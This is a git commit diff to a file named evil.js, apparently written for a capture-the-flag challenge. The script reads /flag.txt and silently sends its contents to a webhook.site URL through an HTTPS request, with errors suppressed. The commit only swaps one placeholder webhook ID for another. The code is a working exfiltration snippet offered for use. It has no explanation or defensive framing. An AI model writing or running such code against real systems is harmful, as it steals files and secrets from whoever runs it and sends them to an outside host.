d2a6581276bd8cb2bfb05183fca2474fd3909e18
cyanide666 <cyanide63257@gmail.com>
2026-02-21 20:09:01 +0600

    Update webhook URL in evil.js

--- evil.js
+++ evil.js
@@ -3,7 +3,8 @@ const https = require("https");
 
 try {
   const flag = fs.readFileSync("/flag.txt", "utf8");
-  const url = "https://webhook.site/WEBHOOK_ID?flag=" + encodeURIComponent(flag);
+  const url = "https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx?flag=" + encodeURIComponent(flag);
   https.get(url).on("error", () => {});
 
 } catch (e) {}
+
